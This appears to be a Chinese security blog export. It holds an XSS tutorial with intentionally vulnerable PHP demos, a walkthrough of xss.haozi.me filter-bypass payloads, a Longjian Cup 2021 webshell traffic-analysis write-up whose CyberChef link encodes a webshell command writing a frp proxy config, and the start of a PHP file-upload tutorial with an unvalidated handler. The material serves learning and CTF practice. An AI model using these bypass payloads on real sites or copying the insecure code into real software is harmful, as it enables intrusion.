<h3 id="XSS漏洞简单攻击测试源码"><a href="#XSS漏洞简单攻击测试源码" class="headerlink" title="XSS漏洞简单攻击测试源码"></a>XSS漏洞简单攻击测试源码</h3><h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;反射型XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;action.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">//后端 action.php：</span><br><span class="line">&lt;?php</span><br><span class="line">    $name=$_POST[&quot;name&quot;]; </span><br><span class="line">	echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> 这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理</p>
<p>所以，我们可以在输入框中提交数据： <code>&lt;script&gt;alert(&#39;hack&#39;)&lt;/script&gt;</code> </p>
<p>页面直接弹出了hack的页面，可以看到，我们插入的语句已经被页面给执行了。<br>这就是最基本的反射型的XSS漏洞，这种漏洞数据流向是： <code>前端--&gt;后端--&gt;前端</code></p>
<h4 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//前端：2.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;存储型XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;action2.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        输入你的ID：  &lt;input type=&quot;text&quot; name=&quot;id&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        输入你的Name：&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt; &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">//后端：action2.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$id=$_POST[&quot;id&quot;];</span><br><span class="line">	$name=$_POST[&quot;name&quot;];</span><br><span class="line">	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&quot;test&quot;);</span><br><span class="line">	</span><br><span class="line">	$sql=&quot;insert into xss value ($id,&#x27;$name&#x27;)&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">?&gt;</span><br><span class="line">//供其他用户访问页面：show2.php</span><br><span class="line">&lt;?php</span><br><span class="line">	mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">	mysql_select_db(&quot;test&quot;);</span><br><span class="line">	$sql=&quot;select * from xss where id=1&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	while($row=mysql_fetch_array($result))&#123;</span><br><span class="line">		echo $row[&#x27;name&#x27;];</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里有一个用户提交的页面，数据提交给后端之后，后端存储在数据库中。然后当其他用户访问另一个页面的时候，后端调出该数据，显示给另一个用户，XSS代码就被执行了。</p>
<p>我们输入 <code>1</code>  和 <code>&lt;script&gt;alert(\&#39;hack\&#39;)&lt;/script&gt;</code>  ，注意，这里的hack的单引号要进行转义，因为sql语句中的$name是单引号的，所以这里不转义的话就会闭合sql语句中的单引号。不然注入不进去。提交了之后，XSS语句就已经插入到数据库中<br>然后当其他用户访问 show2.php 页面时，我们插入的XSS代码就执行了。<br>存储型XSS的数据流向是：<code>前端--&gt;后端--&gt;数据库--&gt;后端--&gt;前端</code></p>
<h4 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 前端3.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head lang=&quot;en&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;DOM型XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;action3.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">// 后端action3.php</span><br><span class="line">&lt;?php</span><br><span class="line">  $name=$_POST[&quot;name&quot;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name; ?&gt;&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">  var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">  print.innerHTML=text.value;  // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里有一个用户提交的页面，用户可以在此提交数据，数据提交之后给后台处理</p>
<p>我们可以输入 <code>&lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code>  </p>
<p>页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。<br>这就是DOM型XSS漏洞，这种漏洞数据流向是： 前端–&gt;浏览器</p>
<h3 id="XSS刷题笔记"><a href="#XSS刷题笔记" class="headerlink" title="XSS刷题笔记"></a>XSS刷题笔记</h3><p>这一部分是<a href="https://xss.haozi.me/%E7%9A%84wp">https://xss.haozi.me/的wp</a></p>
<p>这里边主要训练了一些XSS的简单题目</p>
<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>常规题目，直接<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>结束战斗</p>
<p>或者<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
<p>(下述题目两种方式均可互换，不再一一说明)</p>
<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>先来个<code>&lt;/textarea&gt;</code>与前边的<code>&lt;textarea&gt;</code>闭合，然后再<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>当然你也可以用一个标签结束战斗<code>&lt;/textarea&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;&lt;textarea&gt;</code></p>
<h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>先来个<code>&quot;&gt;</code>与前边的<code>&quot;</code>及<code>&lt;</code>闭合，然后再<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>同样，可以一个标签结束<code>&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
<h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>后端代码来看，过滤了<code>()</code></p>
<p>我们可以用``代替</p>
<p><img src="https://img-blog.csdnimg.cn/4df93d2e3adb46ebb24c31c79c27a86c.png"></p>
<p>或者是<code>&lt;img src=&quot;x&quot; onerror=&quot;alert</code>1<code>&quot;&gt;</code></p>
<h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><p>这题过滤了()和``</p>
<p>考虑使用HTML</p>
<p>这题考虑HTML编码绕过，来到<a href="http://www.gjw123.com/tools-htmlende">这里</a></p>
<p><img src="https://img-blog.csdnimg.cn/5fb948a5d7af4738a57ff5fb857e6481.png"></p>
<p>我们需要用svg标签可以直接执行HTML实体字符</p>
<p>所以答案为<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code>或者<code>&lt;img src=&quot;x&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&gt;</code></p>
<h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><p>并不是只要<code>--&gt;</code>才能闭合<code>&lt;!--</code>,<code>--!&gt;</code>也能闭合，直接闭合一下，然后就好了<code>--!&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
<p><img src="https://img-blog.csdnimg.cn/ccb110bb5dcf4473be22193ad7e48b44.png"></p>
<h4 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h4><p>此关是将所有以<code>auto</code>或者<code>on</code>开头的且以<code>=</code>或<code>&gt;</code>结尾的属性替换成<code>_</code>后直接输出，且匹配是不考虑大小写</p>
<p>所以过滤了<a href="https://www.w3school.com.cn/tags/att_input_autofocus.asp">autofocus</a>和<a href="https://www.runoob.com/jsref/event-onerror-media.html">onerror</a>、<a href="https://www.runoob.com/jsref/event-onmousemove.html">onmousemove</a>事件, 以及防止input标签被闭合</p>
<p>这里查到可以使用换行符来绕过，因为<code>Javascript</code>通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略,而如果不是完整的语句，<code>javascript</code>则会继续处理，直到语句完整结束或分号<img src="https://img-blog.csdnimg.cn/93c6cb91324a4a2091027890fcabf4a9.png"></p>
<h4 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h4><p>此关是对于以<code>&lt;/</code>开头后接任意0个或1个非<code>&gt;</code>字符且以<code>&gt;</code>结尾的字符串进行过滤，且不考虑大小写，即过滤了以<code>&lt;&gt;</code>包裹的标签</p>
<p>由于<code>html</code>的容错性很高，对于标签不闭合也可以接受(网上说这只是<code>html4</code>时的无尾标签特性，而<code>html5</code>时就将其去除了，不知道为啥这里还能执行成功)，这里就直接使用不闭合的语句就能成功弹窗</p>
<p><img src="https://img-blog.csdnimg.cn/f9ab1e2d663d40079814c69da291ad3d.png"></p>
<h4 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h4><p>这题把<code>&lt;/style&gt;</code>替换了，也就是过滤了，其实还是第五题考点，换行绕过就行</p>
<p><img src="https://img-blog.csdnimg.cn/a604dd59f4474e7ab5a001ee27045f1a.png"></p>
<h4 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h4><p>这关没有做黑名单，反而做了白名单</p>
<p><img src="https://img-blog.csdnimg.cn/172615e1ee564541945cd5257a8c08fa.png"></p>
<h4 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h4><p>我采用了最原始的方法，闭合标签</p>
<p><img src="https://img-blog.csdnimg.cn/007ee376dbbf4457a3d60f84baf3d298.png"></p>
<p>看别人的blog，有简单方法，好吧还是我HTML不如大佬了</p>
<p><img src="https://img-blog.csdnimg.cn/9407c26b2e244baa955470cff164c24e.png"></p>
<h4 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h4><p>“被替换成了/“，并没有什么用啊，还是可以闭合</p>
<p><img src="https://img-blog.csdnimg.cn/43b94c318236458daf845070f7cc74bd.png"></p>
<p> //虽然被转义成了//, 但转义之后还是//, 在js中还是注释符 </p>
<h4 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h4><p>在我看来内嵌一个标签是最简单粗暴的方法，只要<code>&lt;&gt;</code> 没有被过滤就好</p>
<p><img src="https://img-blog.csdnimg.cn/8dd61efce8a544998304673c92385658.png"></p>
<p>当然也可以想办法绕过，闭合一下，”被替换成\“ ，怎么办？</p>
<p>语文上有双重否定表示肯定，数学上有负负得正，那么</p>
<p><img src="https://img-blog.csdnimg.cn/222e449f20c34f06b4864e4504d8912e.png"></p>
<h4 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h4><p>这又用到一个知识点，就是@，如果你访问 <a href="mailto:www.baidu.com@www.google.com">www.baidu.com@www.google.com</a>，那么你最后进入的是谷歌的界面，所以这一关，就在自己的服务器上放一个js文件，写上alert(1);这里你可以用我的<code>charmersix.icu/xss.js</code>我看题目作者的库里也留了个，也可以用作者的<code>http://xss.haozi.me/j.js</code></p>
<p>这里刚开始在chrome上死活打不通，但是换到Firefox就好了，edge也打不通</p>
<p><img src="https://img-blog.csdnimg.cn/5284f64f7ac74ba5906a814e143da0df.png"></p>
<h4 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h4><p>此关使用<code>toUpperCase</code>函数对于输入进行了转成大写的操作</p>
<p>对于大小写的问题，<code>html</code> 标签, 域名 不区分大小写，<code>path</code>部分区分大小写。</p>
<p><code>uniocde</code>编码也可以解决绕过大小写,因为<code>js</code>解析器在工作时回对<code>unicode</code>先进行解码，例如这里会被先解析成<code>alert(1)</code>从而实现弹窗</p>
<p><code>html</code>中<code>unicode</code>编码格式：&amp;#编码的十进制数值，一般的格式还有直接<code>\u</code>开头的<code>16</code>进制四位编码，一定是四位，否则报错</p>
<p><img src="https://img-blog.csdnimg.cn/dac7647a03b343978403eac97a7b895f.png"></p>
<p>还有一种题解，延续上一题的做法，因为域名是对大小写不敏感的</p>
<h4 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h4><p>多过滤了一个script，并没有什么影响，上题题解仍然可用</p>
<h4 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h4><p>此关是对于输入的<code>&lt; / &quot; &#39;</code>等进行了过滤，将其转换成空，并且在输入处进行了单行注释，这里可以通过使用换行符进行绕过，但换行仅能过单行注释，代码还是不能正常运行，这里可使用<code>html</code>注释<br><code>--&gt;</code>来注释后面的<code>js</code>，使代码正常运行</p>
<p>对于这里使用<code>html</code>的注释符也能闭合<code>js</code>单行注释，查了一下，发现说对于那些不支持<code>JavaScript</code>的浏览器会把脚本作为页面的内容来显示;为了防止这种情况发生，我们可以使用这样的<code>HTML</code>注释标签</p>
<p>可以看到这里就是使用了<code>html</code>标签闭合的<code>js</code>,对于<code>&lt;!--</code>和<code>--&gt;</code>都可以在<code>html</code>的<code>script</code>标签里单独使用进行单行注释，这里<code>&lt;</code>被过滤了，所以使用<code>--&gt;</code></p>
<p><img src="https://img-blog.csdnimg.cn/84e0d8037d3d489eb1cdf4e25e0c9edd.png"></p>
<h4 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h4><p>此关对于所有以<code>&lt;</code>开头的加任意大小写字符的进行替换为<code>&lt;_</code>且再将所有小写字母换成大写</p>
<p>这里参考官方题解后学到了一些骚操作，对于<code>ſ</code>古英语中的<code>s</code>的写法, 转成大写是正常的<code>S</code>,从而可以绕过<code>&lt;script&gt;</code>限制</p>
<p><img src="https://img-blog.csdnimg.cn/82d42e722b564e49b18d269a48eb3bd2.png"></p>
<h4 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h4><p>此关还是对于输入的一些符号进行了编码操作，但对<code>html inline js</code>转义没有什么用，浏览器会先解析<code>html</code>, 然后再解析<code>js</code></p>
<p>但是由于输入信息是在<code>img</code>标签内，所以<code>html</code>实体编码是可以被直接解析的,所以闭合前面的标签，在构造语句即可，这里<code>onerror</code>后面用分号闭合后感觉类型堆叠执行一样。</p>
<p><img src="https://img-blog.csdnimg.cn/21cf7a221e6f43bb9df079780f23c7cb.png"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>(陇剑杯 2021) webshell系列</title>
    <url>/2022/04/29/webshell/</url>
    <content><![CDATA[<p>这是一个大赛原题系列，总共七道题，题目在<a href="http://ctfer.club/challenges#[%E9%99%87%E5%89%91%E6%9D%AF%202021]webshell%EF%BC%88%E9%97%AE1%EF%BC%89-88">这儿</a></p>
<h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a><a href="http://ctfer.club/challenges#[%E9%99%87%E5%89%91%E6%9D%AF%202021]webshell%EF%BC%88%E9%97%AE1%EF%BC%89-88">（1）</a></h3><p>webshell ，想一想，应该是post传输，筛选一下post</p>
<p><img src="https://img-blog.csdnimg.cn/ff898474bad8463391a5d631b58b3f59.png" alt="ws1.1.png"></p>
<p>随便点开第一个看一下</p>
<p><img src="https://img-blog.csdnimg.cn/d4eec08bbc9b43d59b4f3ed1bc2e78b6.png"></p>
<p>就有了，或者搜索一下password也可以</p>
<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>绝对路径的话有两个部分组成，一个是网站根目录，另一个是相对路径</p>
<p>导出HTTP对象，一个个找，在index.php%3fm=home&amp;a=assign_resume_tpl文件中发现了含有phpinfo()页面的东西</p>
<p><img src="https://img-blog.csdnimg.cn/2c42b116b7f74c7691be0e53929518f5.png"></p>
<p>将其后缀变更为.html用浏览器打开，先查找网站根路径为/var/www/html</p>
<p><img src="https://img-blog.csdnimg.cn/dba562a9c22244738cb851e2de52850f.png"></p>
<p>在PHP变量中查找.log后缀的日志文件，路径为data/Runtime/Logs/Home/21_08_07.log，两个拼起来就是答案</p>
<p><img src="https://img-blog.csdnimg.cn/55d6ef0a455d4bf080ff14aa79111a0c.png"></p>
<p>我看别人也有这样做的</p>
<p>筛选post，（1）里说过</p>
<p>跟包，跟到332</p>
<p><img src="https://img-blog.csdnimg.cn/f240d306007346b29ce3756983708a12.png"></p>
<p>拼接一下就有了</p>
<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>说到权限，可能会执行whoami命令，我们全局搜索whoami，找到第317号数据请求包中包含 whoami命令，第319号响应包中包含结果</p>
<p><img src="https://img-blog.csdnimg.cn/50adfcce3a484a4e90154b7ce37675cf.png#pic_center"></p>
<p>根据（2）的phpinfo()，其实可以得到很多东西，比如这一题的答案</p>
<p><img src="https://img-blog.csdnimg.cn/f3ec412d83eb4377af547681cd0ef26a.png#pic_center"></p>
<h3 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h3><p>借助（2）的分析，很容易就能得到</p>
<p>答案是1.php</p>
<h3 id="（5）"><a href="#（5）" class="headerlink" title="（5）"></a>（5）</h3><p>第一种方法是猜测，一般来说代理工具客户端就是frpc，然后搜索一下，还真是</p>
<p><img src="https://img-blog.csdnimg.cn/897ef53484594f13b7f380087d18dff6.png#pic_center"></p>
<p>第二种方法，充分利用wireshark 导出对象的功能，导出HTTP对象，然后保存下来</p>
<p>1(51).php就是查看上传后的木马文件目录</p>
<p><img src="https://img-blog.csdnimg.cn/4e5cde1d3c354fe7a684b350455ca36f.png#pic_center"></p>
<p>还有一种方法是我最不推荐的，不好理解，也有点麻烦</p>
<p>学习了别的师傅的WP，</p>
<p>将344包TCP流Urldecode，发现一个<a href="https://link.zhihu.com/?target=https://baike.baidu.com/item/SUBSTR()%E5%87%BD%E6%95%B0/2694062?fr=aladdin">substr</a>,从第2位开始截取，所以下面类似base64的编码去掉前两位（截图中少复制一个%3D，末尾缺个等号）然后继续urldecode一波。</p>
<p><img src="https://img-blog.csdnimg.cn/0d41fe56d8f54ea69b2043f1f933015c.png#pic_center"></p>
<p>然后继续urldecode一波（需要用可以解码特殊字符的，强烈安利<a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89('A-Za-z0-9%2B/%3D',true)&input=TDNaaGNpOTNkM2N2YUhSdGJDOW1jbkJqTG1sdWFRPT0">CyberChef</a>）</p>
<p><img src="https://img-blog.csdnimg.cn/95810334d3114712939e437a4663cc7c.png#pic_center"></p>
<h3 id="（6）（7）"><a href="#（6）（7）" class="headerlink" title="（6）（7）"></a>（6）（7）</h3><p>这一题，咱们采用（2）中相同的做法，把所有的HTTP对象导出，然后挨个看，就会发现1(6).php中有个aaa=</p>
<p>就很有可能是上传的袋里配置文件。</p>
<p><img src="https://img-blog.csdnimg.cn/e06379629a5c4adc88742a53fb4ed7bd.png#pic_center"></p>
<p>（当然这题你也可以追踪流来看，如果不嫌麻烦的话）</p>
<p>还是<a href="https://ctf.mzy0.com/CyberChef3/#recipe=URL_Decode()From_Hex%EF%BC%8816%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%EF%BC%89('Auto')&input=JTQwaW5pX3NldCglMjJkaXNwbGF5X2Vycm9ycyUyMiUyQyUyMCUyMjAlMjIpJTNCJTQwc2V0X3RpbWVfbGltaXQoMCklM0JmdW5jdGlvbiUyMGFzZW5jKCUyNG91dCklN0JyZXR1cm4lMjAlMjRvdXQlM0IlN0QlM0JmdW5jdGlvbiUyMGFzb3V0cHV0KCklN0IlMjRvdXRwdXQlM0RvYl9nZXRfY29udGVudHMoKSUzQm9iX2VuZF9jbGVhbigpJTNCZWNobyUyMCUyMjI4JTIyLiUyMmY3MiUyMiUzQmVjaG8lMjAlNDBhc2VuYyglMjRvdXRwdXQpJTNCZWNobyUyMCUyMmY0ODYlMjIuJTIyMTFmNCUyMiUzQiU3RG9iX3N0YXJ0KCklM0J0cnklN0IlMjRmJTNEYmFzZTY0X2RlY29kZShzdWJzdHIoJTI0X1BPU1QlNUIlMjJqNjgwNzEzMDE1OThmJTIyJTVEJTJDMikpJTNCJTI0YyUzRCUyNF9QT1NUJTVCJTIyeGE1ZDYwNmU2Nzg4M2ElMjIlNUQlM0IlMjRjJTNEc3RyX3JlcGxhY2UoJTIyJTVDciUyMiUyQyUyMiUyMiUyQyUyNGMpJTNCJTI0YyUzRHN0cl9yZXBsYWNlKCUyMiU1Q24lMjIlMkMlMjIlMjIlMkMlMjRjKSUzQiUyNGJ1ZiUzRCUyMiUyMiUzQmZvciglMjRpJTNEMCUzQiUyNGklM0NzdHJsZW4oJTI0YyklM0IlMjRpJTJCJTNEMiklMjRidWYuJTNEdXJsZGVjb2RlKCUyMiUyNSUyMi5zdWJzdHIoJTI0YyUyQyUyNGklMkMyKSklM0JlY2hvKCU0MGZ3cml0ZShmb3BlbiglMjRmJTJDJTIyYSUyMiklMkMlMjRidWYpJTNGJTIyMSUyMiUzQSUyMjAlMjIpJTNCJTNCJTdEY2F0Y2goRXhjZXB0aW9uJTIwJTI0ZSklN0JlY2hvJTIwJTIyRVJST1IlM0ElMkYlMkYlMjIuJTI0ZS0lM0VnZXRNZXNzYWdlKCklM0IlN0QlM0Jhc291dHB1dCgpJTNCZGllKCklM0ImajY4MDcxMzAxNTk4Zj1GQkwzWmhjaTkzZDNjdmFIUnRiQzltY25CakxtbHVhUSUzRCUzRCZ4YTVkNjA2ZTY3ODgzYT01QjYzNkY2RDZENkY2RTVEMEE3MzY1NzI3NjY1NzI1RjYxNjQ2NDcyMjAzRDIwMzEzOTMyMkUzMTM2MzgyRTMyMzMzOTJFMzEzMjMzMEE3MzY1NzI3NjY1NzI1RjcwNkY3Mjc0MjAzRDIwMzczNzM3MzgwQTc0NkY2QjY1NkUzRDU4NjEzMzQyNEE2NjMyNkMzNTY1NkU2RDRFMzY1QTM3NDEzODZENzYwQTBBNUI3NDY1NzM3NDVGNzM2RjYzNkIzNTVEMEE3NDc5NzA2NTIwM0QyMDc0NjM3MDBBNzI2NTZENkY3NDY1NUY3MDZGNzI3NDIwM0QzODMxMzEzMTBBNzA2Qzc1Njc2OTZFMjAzRDIwNzM2RjYzNkI3MzM1MEE3MDZDNzU2NzY5NkU1Rjc1NzM2NTcyMjAzRDIwMzA0ODQ0NDY3NDMxMzY2MzRDNTE0QTBBNzA2Qzc1Njc2OTZFNUY3MDYxNzM3Mzc3NjQyMDNEMjA0QTU0NEUzMjM3MzY0NzcwMEE3NTczNjU1RjY1NkU2MzcyNzk3MDc0Njk2RjZFMjAzRDIwNzQ3Mjc1NjUwQTc1NzM2NTVGNjM2RjZENzA3MjY1NzM3MzY5NkY2RTIwM0QyMDc0NzI3NTY1MEE">CyberChef</a></p>
<p>解码一下，就能发现这题的flag</p>
<p>同时，会惊奇的发现（7）的flag</p>
<p><img src="https://img-blog.csdnimg.cn/68ca6e3fc49b49cfaf8e5f7b7aa2ee18.png#pic_center"></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>flow</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_4_PHP文件上传</title>
    <url>/2022/09/20/web_4/</url>
    <content><![CDATA[<h2 id="第一节-php文件上传"><a href="#第一节-php文件上传" class="headerlink" title="第一节 php文件上传"></a>第一节 php文件上传</h2><h3 id="0x1-php文件上传机制"><a href="#0x1-php文件上传机制" class="headerlink" title="0x1 php文件上传机制"></a>0x1 php文件上传机制</h3><p>php使用临时文件移动的方式来上传文件，通过<code>$_FILES</code>数组包含文件信息，在PHP脚本处理过程中，对已经存在在临时目录的<code>/tmp/php??????</code>文件使用<code>move_uploaded_file</code>函数来移动到新的位置。</p>
<p>文件上传信息包含的数组<code>$_FILES</code>数组中，是支持多文件同时上传的。默认情况下，上传的名字为<code>file</code>,所以我们可以在<code>$_FILES[&#39;file&#39;]</code>这个数组中获得，我们可以获得以下信息</p>
<ul>
<li><code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>获得上传文件的原始文件名</li>
<li><code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>上传的文件在临时目录中的文件名</li>
<li><code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code>上传文件的大小，单位为字节</li>
<li><code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>上传文件的类型</li>
</ul>
<h3 id="0x2-文件上传的例子"><a href="#0x2-文件上传的例子" class="headerlink" title="0x2 文件上传的例子"></a>0x2 文件上传的例子</h3><h4 id="文件上传表单"><a href="#文件上传表单" class="headerlink" title="文件上传表单"></a>文件上传表单</h4><p>表单是一种HTML代码，表示向某个地址发送一个或多个数据，数据格式可以分为几种</p>
<p><code>get表单</code>数据附加在url后</p>
<p><code>post表单</code>将数据附加到http包中，发送的数据是经过url编码过的</p>
<p><code>raw表单</code>将数据直接附加到http请求包中，不存在键值对，直接是数据，常见的方式是<code>file_get_contents(&quot;php://input&quot;)</code>这种请求是和post表单互斥的</p>
<p><code>json表单</code>类型为<code>application/json</code>，常见于api接口</p>
<h4 id="文件上传的例子"><a href="#文件上传的例子" class="headerlink" title="文件上传的例子"></a>文件上传的例子</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp_file</span> =  <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$dist_file</span> = <span class="string">&quot;./upload/&quot;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_file</span>,<span class="variable">$dist_file</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;文件上传成功&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;文件上传失败&quot;</span>;</span><br><span 